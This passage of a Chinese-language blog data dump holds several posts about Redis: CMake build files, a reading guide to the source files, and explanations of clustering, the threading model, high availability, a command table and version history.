PRIVATE $&#123;REDIS_ROOT&#125;/deps/linenoise PRIVATE $&#123;REDIS_ROOT&#125;/deps/hiredis PRIVATE $&#123;REDIS_ROOT&#125;/deps/lua/src)target_link_libraries(redis-server PRIVATE pthread PRIVATE m PRIVATE lua PRIVATE linenoise PRIVATE hiredis)add_executable(redis-cli $&#123;SRC_CLI&#125;)target_include_directories(redis-cli PRIVATE $&#123;REDIS_ROOT&#125;/deps/linenoise PRIVATE $&#123;REDIS_ROOT&#125;/deps/hiredis PRIVATE $&#123;REDIS_ROOT&#125;/deps/lua/src)target_link_libraries(redis-cli PRIVATE pthread PRIVATE m PRIVATE linenoise PRIVATE hiredis) redis/deps1234add_subdirectory(linenoise)add_subdirectory(lua)add_subdirectory(hiredis) linenoise123456➜ vi deps/linenoise/CMakeLists.txtadd_library(linenoise linenoise.c) hiredis1234567891011➜ vi deps/hiredis/CMakeLists.txtadd_library(hiredis STATIC hiredis.c net.c dict.c net.c sds.c async.c read.c) lua1234567891011121314151617➜ vi deps/lua/CMakeLists.txtadd_subdirectory(src)➜ vi deps/lua/src/CMakeLists.txtset(LUA_SRC lapi.c lcode.c ldebug.c ldo.c ldump.c lfunc.c lgc.c llex.c lmem.c lobject.c lopcodes.c lparser.c lstate.c lstring.c ltable.c ltm.c lundump.c lvm.c lzio.c strbuf.c fpconv.c lauxlib.c lbaselib.c ldblib.c liolib.c lmathlib.c loslib.c ltablib.c lstrlib.c loadlib.c linit.c lua_cjson.c lua_struct.c lua_cmsgpack.c lua_bit.c)add_library(lua STATIC $&#123;LUA_SRC&#125;) redis/src/modules123456789101112131415161718➜ vi src/modules/CMakeLists.txtcmake_minimum_required(VERSION 3.9)set(CMAKE_BUILD_TYPE &quot;Debug&quot;)add_library(helloworld SHARED helloworld.c)set_target_properties(helloworld PROPERTIES PREFIX &quot;&quot; SUFFIX &quot;.so&quot;)add_library(hellotype SHARED hellotype.c)set_target_properties(hellotype PROPERTIES PREFIX &quot;&quot; SUFFIX &quot;.so&quot;)add_library(helloblock SHARED helloblock.c)set_target_properties(helloblock PROPERTIES PREFIX &quot;&quot; SUFFIX &quot;.so&quot;)add_library(testmodule SHARED testmodule.c)set_target_properties(testmodule PROPERTIES PREFIX &quot;&quot; SUFFIX &quot;.so&quot;) make12➜ cmake. ➜ make","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"1.1.redis-源码分析导读","slug":"data/redis/code/1.1.源码分析导读","date":"2022-04-07T01:21:38.756Z","updated":"2022-04-07T01:21:38.756Z","comments":true,"path":"2022/04/07/data/redis/code/1.1.源码分析导读/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/1.1.%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%AF%BC%E8%AF%BB/","excerpt":"","text":"Redis源码分析前言Redis是使用C写的，而C中根本不存在string,list,hash，set和zset这些数据类型，那么C是如何将这些数据类型实现出来的呢？对于常见的复制，通知，哨兵，集群等功能，又是如何实现的。Redis代码规模小，文件数量也不多，所以开始对Redis源码进行分析。 准备工作首先去官网下载文件，下载完解压即可，我们是对src中的文件进行分析。 先确定下针对学习路线： 1.第一阶段 各种数据类型的底层实现 string的底层实现 SDS sds.h和sds.c list的底层实现 adlist.h和adlist.c hash的底层实现 dict.h和dict.c hash和list的底层实现 ziplist.h和ziplist zset的底层实现 skiplist.h和skiplist.c set的底层实现 intset.h和intset.c 2.第二阶段 redis 对底层实现的封装 string的封装 t_string.c list的封装 t_list.c hash的封装 t_hash.c set的封装 t_set.c zset的封装 t_zset.c 对象系统 object.c 3.第三阶段 Redis的持久化机制 RDB持久化 rdb.h和rdb.c AOF持久化 aof.c RDB &amp; AOF结合 4.第四阶段 通知 通知功能 notify.c 5.第五阶段 熟悉客户端和服务端的代码实现 事务处理模块 ae.h , ae.c，ae_epoll.c，ae_evport.c，ae_kqueue.c，ae_select.c 6.第六阶段 Redis的复制 replication.c 7.第七阶段 Redis哨兵 sentinel.c 8.第八阶段 Redis集群 cluster.h和cluster.c 附录：各个源码文件的作用简介 +——————————————————————-+——————————————————————-+| 文件 | 作用 |+===================================================================+===================================================================+| adlist.c 、 adlist.h | 双端链表数据结构的实现。 |+——————————————————————-+——————————————————————-+| ae.c 、 ae.h 、 ae_epoll.c 、 ae_evport.c 、 | 事件处理器，以及各个具体实现。 || ae_kqueue.c 、 ae_select.c | |+——————————————————————-+——————————————————————-+| anet.c 、 anet.h | Redis 的异步网络框架，内容主要为对 socket 库的包装。 |+——————————————————————-+——————————————————————-+| aof.c | AOF 功能的实现。 |+——————————————————————-+——————————————————————-+| asciilogo.h | 保存了 Redis 的 ASCII LOGO 。 |+——————————————————————-+——————————————————————-+| bio.c 、 bio.h | Redis 的后台 I/O 程序，用于将 I/O 操作放到子线程里面执行， || | 减少 I/O 操作对主线程的阻塞。 |+——————————————————————-+——————————————————————-+| bitops.c | 二进制位操作命令的实现文件。 |+——————————————————————-+——————————————————————-+| blocked.c | 用于实现 BLPOP 命令和 WAIT 命令的阻塞效果。 |+——————————————————————-+——————————————————————-+| cluster.c 、 cluster.h | Redis 的集群实现。 |+——————————————————————-+——————————————————————-+| config.c 、 config.h | Redis 的配置管理实现，负责读取并分析配置文件， || | 然后根据这些配置修改 Redis 服务器的各个选项。 |+——————————————————————-+——————————————————————-+| crc16.c 、 crc64.c 、 crc64.h | 计算 CRC 校验和。 |+——————————————————————-+——————————————————————-+| db.c | 数据库实现。 |+——————————————————————-+——————————————————————-+| debug.c | 调试实现。 |+——————————————————————-+——————————————————————-+| dict.c 、 dict.h | 字典数据结构的实现。 |+——————————————————————-+——————————————————————-+| endianconv.c 、 endianconv.h | 二进制的大端、小端转换函数。 |+——————————————————————-+——————————————————————-+| fmacros.h | 一些移植性方面的宏。 |+——————————————————————-+——————————————————————-+| help.h | utils/generate-command-help.rb 程序自动生成的命令帮助信息。 |+——————————————————————-+——————————————————————-+| hyperloglog.c | HyperLogLog 数据结构的实现。 |+——————————————————————-+——————————————————————-+| intset.c 、 intset.h | 整数集合数据结构的实现，用于优化 SET 类型。 |+——————————————————————-+——————————————————————-+| lzf_c.c 、 lzf_d.c 、 lzf.h 、 lzfP.h | Redis 对字符串和 RDB 文件进行压缩时使用的 LZF 压缩算法的实现。 |+——————————————————————-+——————————————————————-+| Makefile 、 Makefile.dep | 构建文件。 |+——————————————————————-+——————————————————————-+| memtest.c | 内存测试。 |+——————————————————————-+——————————————————————-+| mkreleasehdr.sh | 用于生成释出信息的脚本。 |+——————————————————————-+——————————————————————-+| multi.c | Redis 的事务实现。 |+——————————————————————-+——————————————————————-+| networking.c | Redis 的客户端网络操作库， || | 用于实现命令请求接收、发送命令回复等工作， || | 文件中的函数大多为 write 、 read 、 close 等函数的包装， || | 以及各种协议的分析和构建函数。 |+——————————————————————-+——————————————————————-+| notify.c | Redis 的数据库通知实现。 |+——————————————————————-+——————————————————————-+| object.c | Redis 的对象系统实现。 |+——————————————————————-+——————————————————————-+| pqsort.c 、 pqsort.h | 快速排序（QuickSort）算法的实现。 |+——————————————————————-+——————————————————————-+| pubsub.c | 发布与订阅功能的实现。 |+——————————————————————-+——————————————————————-+| rand.c 、 rand.h | 伪随机数生成器。 |+——————————————————————-+——————————————————————-+| rdb.c 、 rdb.h | RDB 持久化功能的实现。 |+——————————————————————-+——————————————————————-+| redisassert.h | Redis 自建的断言系统。 |+——————————————————————-+——————————————————————-+| redis-benchmark.c | Redis 的性能测试程序。 |+——————————————————————-+——————————————————————-+| redis.c | 负责服务器的启动、维护和关闭等事项。 |+——————————————————————-+——————————————————————-+| redis-check-aof.c 、 redis-check-dump.c | RDB 文件和 AOF 文件的合法性检查程序。 |+——————————————————————-+——————————————————————-+| redis-cli.c | Redis 客户端的实现。 |+——————————————————————-+——————————————————————-+| redis.h | Redis 的主要头文件，记录了 Redis 中的大部分数据结构， || | 包括服务器状态和客户端状态。 |+——————————————————————-+——————————————————————-+| redis-trib.rb | Redis 集群的管理程序。 |+——————————————————————-+——————————————————————-+| release.c 、 release.h | 记录和生成 Redis 的释出版本信息。 |+——————————————————————-+——————————————————————-+| replication.c | 复制功能的实现。 |+——————————————————————-+——————————————————————-+| rio.c 、 rio.h | Redis 对文件 I/O 函数的包装， || | 在普通 I/O 函数的基础上增加了显式缓存、以及计算校验和等功能。 |+——————————————————————-+——————————————————————-+| scripting.c | 脚本功能的实现。 |+——————————————————————-+——————————————————————-+| sds.c 、 sds.h | SDS 数据结构的实现，SDS 为 Redis 的默认字符串表示。 |+——————————————————————-+——————————————————————-+| sentinel.c | Redis Sentinel 的实现。 |+——————————————————————-+——————————————————————-+| setproctitle.c | 进程环境设置函数。 |+——————————————————————-+——————————————————————-+| sha1.c 、 sha1.h | SHA1 校验和计算函数。 |+——————————————————————-+——————————————————————-+| slowlog.c 、 slowlog.h | 慢查询功能的实现。 |+——————————————————————-+——————————————————————-+| solarisfixes.h | 针对 Solaris 系统的补丁。 |+——————————————————————-+——————————————————————-+| sort.c | SORT 命令的实现。 |+——————————————————————-+——————————————————————-+| syncio.c | 同步 I/O 操作。 |+——————————————————————-+——————————————————————-+| testhelp.h | 测试辅助宏。 |+——————————————————————-+——————————————————————-+| t_hash.c 、 t_list.c 、 t_set.c 、 t_string.c 、 | 定义了 Redis 的各种数据类型，以及这些数据类型的命令。 || t_zset.c | |+——————————————————————-+——————————————————————-+| util.c 、 util.h | 各种辅助函数。 |+——————————————————————-+——————————————————————-+| valgrind.sup | valgrind 的suppression文件。 |+——————————————————————-+——————————————————————-+| version.h | 记录了 Redis 的版本号。 |+——————————————————————-+——————————————————————-+| ziplist.c 、 ziplist.h | ZIPLIST 数据结构的实现，用于优化 LIST 类型。 |+——————————————————————-+——————————————————————-+| zipmap.c 、 zipmap.h | ZIPMAP 数据结构的实现，在 Redis 2.6 以前用与优化 HASH 类型， || | Redis 2.6 开始已经废弃。 |+——————————————————————-+——————————————————————-+| zmalloc.c 、 zmalloc.h | 内存管理程序。 |+——————————————————————-+——————————————————————-+ 参考： csdn：https://blog.csdn.net/qq_33774822/article/details/106490394 redis设计与实现","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"RedisCluster介绍","slug":"data/redis/Redis集群","date":"2022-04-07T01:21:38.755Z","updated":"2022-04-07T01:21:38.755Z","comments":true,"path":"2022/04/07/data/redis/Redis集群/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/Redis%E9%9B%86%E7%BE%A4/","excerpt":"","text":"一、基本定义RedisCluster是Redis的集群实现，内置数据自动分片机制，集群内部将所有的key映射到16384个Slot中，集群中的每个RedisInstance负责其中的一部分的Slot的读写。集群客户端连接集群中任一Redis Instance即可发送命令，当RedisInstance收到自己不负责的Slot的请求时，会将负责请求Key所在Slot的Redis Instance地址返回给客户端，客户端收到后自动将原请求重新发往这个地址，对外部透明。一个Key到底属于哪个Slot由crc16(key)%16384决定。关于负载均衡，集群的Redis Instance之间可以迁移数据，以Slot为单位，但不是自动的，需要外部命令触发。关于集群成员管理，集群的节点(Redis Instance)和节点之间两两定期交换集群内节点信息并且更新，从发送节点的角度看，这些信息包括：集群内有哪些节点，IP和PORT是什么，节点名字是什么，节点的状态(比如OK，PFAIL，FAIL，后面详述)是什么，包括节点角色(master或者slave)等。关于可用性，集群由N组主从RedisInstance组成。主可以没有从，但是没有从意味着主宕机后主负责的Slot读写服务不可用。一个主可以有多个从，主宕机时，某个从会被提升为主，具体哪个从被提升为主，协议类似于Raft，参见这里。如何检测主宕机？RedisCluster采用quorum+心跳的机制。从节点的角度看，节点会定期给其他所有的节点发送Ping，cluster-node-timeout(可配置，秒级)时间内没有收到对方的回复，则单方面认为对端节点宕机，将该节点标为PFAIL状态。通过节点之间交换信息收集到quorum个节点都认为这个节点为PFAIL，则将该节点标记为FAIL，并且将其发送给其他所有节点，其他所有节点收到后立即认为该节点宕机。从这里可以看出，主宕机后，至少cluster-node-timeout时间内该主所负责的Slot的读写服务不可用。 二、集群搭建过程（3主3从）-手动准备节点配置节点后，启动单个节点，此时每个节点都是单独处在一个集群中节点握手（假设 6379 与 6380 握手）命令：cluster meet ip port过程：节点 6379 本地创建 6380 节点信息对象，并发送 meet 消息节点 6380 接收到 meet 消息后，保存节点 6379 的节点信息并回复 pong 消息（此时握手成功）之后节点 6379 和节点 6380 彼此定期通过 ping/pong 消息进行正常的节点通信在 cluster 内的任一节点执行 cluster meet 命令加入新节点。握手状态会通过消息在集群内传播（gossip 协议），这样其他节点会自动发现新节点并发起握手流程为主节点分配槽命令：cluster addslots {0…5460}注意：主节点尽量选择不同 IP为主节点分配从节点从节点作用：复制主节点 slot 信息和相关的数据；故障转移命令：在从节点上执行 cluster replicate {master-nodeId}尽可能保证主从节点不在同一个机器上 三、集群搭建过程（3 主 3 从）- 自动第十二章 redis-cluster 搭建（redis-3.2.5） 四、节点通信gossip 协议：节点之间彼此不断通信交换信息，一段时间后所有节点都会知道集群完整的信息。通信过程：cluster 中的每个 node 都会单独开辟一个 TCP 通道（通信端口号在基础端口号上加 10000，例如 16379），用于节点之间彼此通信每个节点在固定周期内通过特定规则选择几个节点发送 ping 消息接收到 ping 消息的节点用 pong 消息作为响应 五、请求路由根据 key 计算 slot：计算一个 key 在哪个 slot 上，公式 slot=CRC16(key)&amp;16383根据 slot 查找 slot 所在节点：集群内每个节点都知道所有节点的 slot 信息（相当于节点的本地缓存），根据 slot 可以直接找出所在的 node如果 slot 所在的节点正好是接受命令的当前节点，那么直接执行；如果不是，返回 MOVED slot ip port（之后客户端要再去连接该机器，再执行命令）智能客户端： 客户端本地会缓存一份 hashmap&lt;slot, node&gt;，MOVED slot ip port 可以用来帮助缓存的刷新 参考https://sq.163yun.com/blog/article/224981988104458240","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"Redis线程模型","slug":"data/redis/Redis线程模型","date":"2022-04-07T01:21:38.755Z","updated":"2022-04-07T01:21:38.755Z","comments":true,"path":"2022/04/07/data/redis/Redis线程模型/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/Redis%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"redis单线程模型也许你会怀疑可以支持海量数据、支持高并发的redis怎么可能是单线程。但是，事实上它就是，不要认为单线程就处理不了高并发。像Nginx的worker，它也是单线程。它们都是服务器高性能的典范。 单线程的redis为什么能这么快？ 因为它所有的数据都在内存中，所以运算快。 因为它的IO是异步非阻塞IO 因为不是多线程，反而避免了多线程的频繁上下文切换问题 非阻塞IO 当我们使用套接字的读写方法，默认它们是阻塞的，比如我们使用sread和write。 read：数据在不超过指定的长度的时候有多少读多少，没有数据则会线程一直等待，直到新的数据到来或者连接关闭了，read方法才可以返回，线程才能继续处理。 而write一般来讲不会阻塞，除非内核为套接字分配的写缓冲区满了，write方法就会阻塞。 非阻塞 IO 在套接字对象上提供了一个选项 Non_Blocking，当这个选项打开时，读写方法不会阻塞，而是能读多少读多少，能写多少写多少。能读多少取决于内核为套接字分配的读缓冲区内部的数据字节数，能写多少取决于内核为套接字分配的写缓冲区的空闲空间字节数。读方法和写方法都会通过返回值来告知程序实际读写了多少字节。有了非阻塞 IO 意味着线程在读写 IO 时可以不必再阻塞了，读写可以瞬间完成然后线程可以继续干别的事了。事件轮询 (多路复用)非阻塞 IO 有个问题，那就是线程要读数据，结果读了一部分就返回了，线程如何知道何时才应该继续读。也就是当数据到来时，线程如何得到通知。写也是一样，如果缓冲区满了，写不完，剩下的数据何时才应该继续写，线程也应该得到通知。 事件轮询 API 就是用来解决这个问题的，最简单的事件轮询 API 是select函数，它是操作系统提供给用户程序的API。输入是读写描述符列表read_fds&amp;write_fds，输出是与之对应的可读可写事件。同时还提供了一个timeout参数，如果没有任何事件到来，那么就最多等待timeout时间，线程处于阻塞状态。一旦期间有任何事件到来，就可以立即处理事件。时间过了之后还是没有任何事件到来，就会立即返回。拿到事件后，线程就可以继续挨个处理相应的事件。处理完了继续过来轮询。于是线程就进入了一个死循环，我们把这个死循环称为事件循环，一个循环为一个周期。因为我们通过select系统调用同时处理多个通道描述符的读写事件，因此我们将这类系统调用称为多路复用 API。现代操作系统的多路复用 API已经不再使用select系统调用，而改用epoll(linux)事件轮询 API 就是 Java 语言里面的 NIO 技术 响应队列Redis 同样也会为每个客户端套接字关联一个响应队列。Redis 服务器通过响应队列来将指令的返回结果回复给客户端。如果队列为空，那么意味着连接暂时处于空闲状态，不需要去获取写事件，也就是可以将当前的客户端描述符从write_fds里面移出来。等到队列有数据了，再将描述符放进去。避免select系统调用立即返回写事件，结果发现没什么数据可以写。出这种情况的线程会飙高 CPU。 定时任务服务器处理要响应 IO 事件外，还要处理其它事情。比如定时任务就是非常重要的一件事。如果线程阻塞在 select 系统调用上，定时任务将无法得到准时调度。那 Redis 是如何解决这个问题的呢？Redis 的定时任务会记录在一个称为最小堆的数据结构中。这个堆中，最快要执行的任务排在堆的最上方。在每个循环周期，Redis 都会将最小堆里面已经到点的任务立即进行处理。处理完毕后，将最快要执行的任务还需要的时间记录下来，这个时间就是select系统调用的timeout参数。因为 Redis 知道未来timeout时间内，没有其它定时任务需要处理，所以可以安心睡眠timeout的时间。 redis 的线程模型上面所描述的是相对简单的，我们细致的看一下redis的线程模型。 1.redis基于reactor模式开发了网络事件处理器，这个处理器叫做文件事件处理器，，file event handler。这个文件事件处理器，是单线程的，redis才叫做单线程的模型，采用IO多路复用机制同时监听多个socket，根据socket上的事件来选择对应的事件处理器来处理这个事件。 2.文件事件处理器的结构包含4个部分：多个socket，IO多路复用程序，文件事件分派器，事件处理器（命令请求处理器、命令回复处理器、连接应答处理器，等等） 3.如果被监听的socket准备好执行accept、read、write、close等操作的时候，跟操作对应的文件事件就会产生，这个时候文件事件处理器就会调用之前关联好的事件处理器来处理这个事件。 4.多个socket可能并发的产生不同的操作，每个操作对应不同的文件事件，但是IO多路复用程序会监听多个socket，但是会将socket放入一个队列中排队，每次从队列中取出一个socket给事件分派器，事件分派器把socket给对应的事件处理器。 5.然后一个socket的事件处理完之后，IO多路复用程序才会将队列中的下一个socket给事件分派器。文件事件分派器会根据每个socket当前产生的事件，来选择对应的事件处理器来处理。 6.当socket变得可读时（比如客户端对redis执行write操作，或者close操作），或者有新的可以应答的sccket出现时（客户端对redis执行connect操作），socket就会产生一个AE_READABLE事件。 7.当socket变得可写的时候（客户端对redis执行read操作），socket会产生一个AE_WRITABLE事件。 8.IO多路复用程序可以同时监听AE_REABLE和AE_WRITABLE两种事件，要是一个socket同时产生了AE_READABLE和AE_WRITABLE两种事件，那么文件事件分派器优先处理AE_REABLE事件，然后才是AE_WRITABLE事件。 参考https://www.jianshu.com/p/fc1179521f3c","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"Redis高可用概述","slug":"data/redis/Redis高可用概述","date":"2022-04-07T01:21:38.755Z","updated":"2022-04-07T01:21:38.755Z","comments":true,"path":"2022/04/07/data/redis/Redis高可用概述/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/Redis%E9%AB%98%E5%8F%AF%E7%94%A8%E6%A6%82%E8%BF%B0/","excerpt":"","text":"目录 Redis 内存模型 持久化 主从复制 哨兵 集群 简介持久化：持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份，即将数据存储在硬盘，保证数据不会因进程退出而丢失。复制：复制是高可用 Redis 的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。缺陷：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制。哨兵：在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存储能力受到单机的限制。集群：通过集群，Redis 解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现了较为完善的高可用方案。 Redis 内存模型1、估算 Redis 内存使用量。目前为止，内存的使用成本仍然相对较高，使用内存不能无所顾忌；根据需求合理的评估 Redis 的内存使用量，选择合适的机器配置，可以在满足需求的情况下节约成本。2、优化内存占用。了解 Redis 内存模型可以选择更合适的数据类型和编码，更好的利用 Redis 内存。3、分析解决问题。当 Redis 出现阻塞、内存占用等问题时，尽快发现导致问题的原因，便于分析解决问题。 Redis 持久化持久化的功能：Redis 是内存数据库，数据都是存储在内存中，为了避免进程退出导致数据的永久丢失，需要定期将 Redis 中的数据以某种形式(数据或命令)从内存保存到硬盘；当下次 Redis 重启时，利用持久化文件实现数据恢复。除此之外，为了进行灾难备份，可以将持久化文件拷贝到一个远程位置。Redis 持久化分为 RDB 持久化和 AOF 持久化：前者将当前数据保存到硬盘，后者则是将每次执行的写命令保存到硬盘（类似于 MySQL 的 binlog）；由于 AOF 持久化的实时性更好，即当进程意外退出时丢失的数据更少，因此 AOF 是目前主流的持久化方式，不过 RDB 持久化仍然有其用武之地。 Redis 主从复制数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务，分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高 Redis 服务器的并发量。高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是 Redis 高可用的基础。 Redis SentinelRedis Sentinel，即 Redis 哨兵，在 Redis 2.8 版本开始引入。哨兵的核心功能是主节点的自动故障转移。下面是 Redis 官方文档对于哨兵功能的描述：监控（Monitoring）：哨兵会不断地检查主节点和从节点是否运作正常。自动故障转移（Automatic failover）：当主节点不能正常工作时，哨兵会开始自动故障转移操作，它会将失效主节点的其中一个从节点升级为新的主节点，并让其他从节点改为复制新的主节点。配置提供者（Configuration provider）：客户端在初始化时，通过连接哨兵来获得当前 Redis 服务的主节点地址。通知（Notification）：哨兵可以将故障转移的结果发送给客户端。 Redis Cluster集群，即 Redis Cluster，是 Redis 3.0 开始引入的分布式存储方案。集群由多个节点(Node)组成，Redis 的数据分布在这些节点中。集群中的节点分为主节点和从节点：只有主节点负责读写请求和集群信息的维护；从节点只进行主节点数据和状态信息的复制。集群的作用，可以归纳为两点：1、数据分区：数据分区(或称数据分片)是集群最核心的功能。集群将数据分散到多个节点，一方面突破了 Redis 单机内存大小的限制，存储容量大大增加；另一方面每个主节点都可以对外提供读服务和写服务，大大提高了集群的响应能力。Redis 单机内存大小受限问题，在介绍持久化和主从复制时都有提及；例如，如果单机内存太大，bgsave 和 bgrewriteaof 的 fork 操作可能导致主进程阻塞，主从环境下主机切换时可能导致从节点长时间无法提供服务，全量复制阶段主节点的复制缓冲区可能溢出……。2、高可用：集群支持主从复制和主节点的自动故障转移（与哨兵类似）；当任一节点发生故障时，集群仍然可以对外提供服务。","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"Redis命令汇总","slug":"data/redis/Redis命令汇总","date":"2022-04-07T01:21:38.754Z","updated":"2022-04-07T01:21:38.754Z","comments":true,"path":"2022/04/07/data/redis/Redis命令汇总/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/Redis%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/","excerpt":"","text":"1.Key（键） 命令 描述 示例 备注 DEL DUMP EXISTS EXPIRE EXPIREAT KEYS MIGRATE MOVE OBJECT PERSIST PEXPIRE PEXPIREAT PTTL RANDOMKEY RENAME RENAMENX RESTORE SORT TTL TYPE SCAN 2.String(字符串) 命令 描述 示例 备注 APPEND BITCOUNT BITOP DECR DECRBY GET GETBIT GETRANGE GETSET INCR INCRBY INCRBYFLOAT MGET MSET MSETNX PSETEX SET SETBIT SETEX SETNX SETRANGE STRLEN 3.Hash(哈希表) 命令 描述 示例 备注 HDEL HEXISTS HGET HGETALL HINCRBY HINCRBYFLOAT HKEYS HLEN HMGET HMSET HSET HSETNX HVALS HSCAN 4.List（列表） 命令 描述 示例 备注 BLPOP BRPOP BRPOPLPUSH LINDEX LINSERT LLEN LPOP LPUSH LPUSHX LRANGE LREM LSET LTRIM RPOP RPOPLPUSH RPUSH RPUSHX 5.Set（集合） 命令 描述 示例 备注 SADD SCARD SDIFF SDIFFSTORE SINTER SINTERSTORE SISMEMBER SMEMBERS SMOVE SPOP SRANDMEMBER SREM SUNION SUNIONSTORE SSCAN 6.SortedSet（有序集合） 命令 描述 示例 备注 ZADD ZCARD ZCOUNT ZINCRBY ZRANGE 有序集合按(索引)score递增(小—&gt;大) ZRANGE salary 1 2 WITHSCORES ZRANGE key start stop [WITHSCORES] ZRANGEBYSCORE 有序集合按(分数)score递增(小-&gt;大) ZRANGEBYSCORE salary -inf +inf WITHSCORES ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT offset count] ZRANK 有序集合中member排名(小-大) ZRANK salary tom (0开始计数) ZRANK key member ZREM ZREMRANGEBYRANK ZREMRANGEBYSCORE ZREVRANGE ZREVRANGEBYSCORE 有序集合按score递减(大-&gt;小) ZREVRANGEBYSCORE salary 10000 2000 ZREVRANGEBYSCORE key max min [WITHSCORES] [LIMIT offset count] ZREVRANK ZSCORE ZUNIONSTORE ZINTERSTORE ZSCAN 7.Pub/Sub（发布/订阅） 命令 描述 示例 备注 PSUBSCRIBE PUBLISH PUBSUB PUNSUBSCRIBE SUBSCRIBE UNSUBSCRIBE 8.Transaction（事务） 命令 描述 示例 备注 DISCARD EXEC MULTI UNWATCH WATCH 9.Script（脚本） 命令 描述 示例 备注 EVAL EVALSHA SCRIPT EXISTS SCRIPT FLUSH SCRIPT KILL SCRIPT LOAD 10.Connection（连接） 命令 描述 示例 备注 AUTH ECHO PING QUIT SELECT 11.Server（服务器） 命令 描述 示例 备注 BGREWRITEAOF BGSAVE CLIENT GETNAME CLIENT KILL CLIENT LIST CLIENT SETNAME CONFIG GET CONFIG RESETSTAT CONFIG REWRITE CONFIG SET DBSIZE DEBUG OBJECT DEBUG SEGFAULT FLUSHALL FLUSHDB INFO LASTSAVE MONITOR PSYNC SAVE SHUTDOWN SLAVEOF SLOWLOG SYNC TIME 12.Cluster(集群) 命令 描述 示例 备注 CLUSTER HELP 支持命令及描述 CLUSTER HELP CLUSTER ADDSLOTS 为当前节点分配槽位 CLUSTER ADDSLOTS 0 5 CLUSTER BUMPEPOCH 推进集群配置纪元 CLUSTER BUMPEPOCH CLUSTER COUNT-failure-reports 返回的失败报告数量 CLUSTER COUNT-failure-reports node-id CLUSTER COUNTKEYSINSLOT 返回&lt;槽位&gt;中的键数 CLUSTER COUNTKEYSINSLOT 1 CLUSTER DELSLOTS 删除当前节点的槽位信息 CLUSTER DELSLOTS 2 5 CLUSTER FAILOVER 集群故障转移 CLUSTER FAILOVER CLUSTER FORGET 删除节点 CLUSTER FORGET node-id CLUSTER GETKEYSINSLOT 返回当前节点存储在slot中的键名 CLUSTER GETKEYSINSLOT 1000 3 CLUSTER FLUSHSLOTS 删除当前节点自己的槽位信息 CLUSTER FLUSHSLOTS CLUSTER INFO 返回集群信息 CLUSTER INFO CLUSTER KEYSLOT 返回的哈希槽 CLUSTER KEYSLOT 1 CLUSTER MEET 将节点连接到一个工作集群 CLUSTER MEET 10.3.4.111 7001 CLUSTER MYID 返回当前节点ID CLUSTER MYID CLUSTER NODES 返回集群节点信息 CLUSTER NODES CLUSTER REPLICATE 将当前节点配置为副本 CLUSTER REPLICATE node-id CLUSTER RESET 重置当前节点 CLUSTER RESET CLUSTER SETSLOT 修改接受节点中哈希槽的状态 CLUSTER SETSLOT 1 MIGRATING node-id CLUSTER REPLICAS 返回节点REPLICAS CLUSTER REPLICAS node-id CLUSTER SET-CONFIG-EPOCH 修改接受节点中哈希槽的状态 CLUSTER SET-CONFIG-EPOCH 1 CLUSTER SLOTS 返回节点槽位 CLUSTER SLOTS","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"Redis各版本特性","slug":"data/redis/Redis各版本特性","date":"2022-04-07T01:21:38.754Z","updated":"2022-04-07T01:21:38.754Z","comments":true,"path":"2022/04/07/data/redis/Redis各版本特性/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/Redis%E5%90%84%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7/","excerpt":"","text":"redis各版本特性Redis借鉴了Linux操作系统对于版本号的命名规则：版本号第二位如果是奇数，则为非稳定版本（例如2.7、2.9、3.1），如果是偶数，则为稳定版本（例如2.6、2.8、3.0、3.2）。当前奇数版本就是下一个稳定版本的开发版本，例如2.9版本是3.0版本的开发版本。所以我们在生产环境通常选取偶数版本的Redis，如果对于某些新的特性想提前了解和使用，可以选择最新的奇数版本。 1.Redis2.6Redis2.6在2012年正式发布，经历了17个版本，到2.6.17版本 